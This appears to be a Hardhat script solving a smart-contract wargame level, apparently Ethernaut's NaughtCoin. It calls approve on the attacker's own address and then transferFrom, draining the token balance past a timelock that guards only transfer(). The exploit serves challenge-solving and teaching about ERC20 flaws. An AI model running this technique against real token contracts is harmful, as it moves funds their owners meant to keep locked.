import { BigNumber } from "ethers";
import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0xf8988D7F48EC690809f835D857fE18207c5F5e12";
const CONTRACT_NAME = "NaughtCoin";

async function main() {
  const [attacker] = await ethers.getSigners();

  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESS);

  const tokens = BigNumber.from(10).pow(18).mul(1000000);

  const tx = await contract.approve(attacker.address, tokens);
  await tx.wait();

  const tx2 = await contract.transferFrom(attacker.address, "0x0000000000000000000000000000000000000001", tokens);
  await tx2.wait();
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});
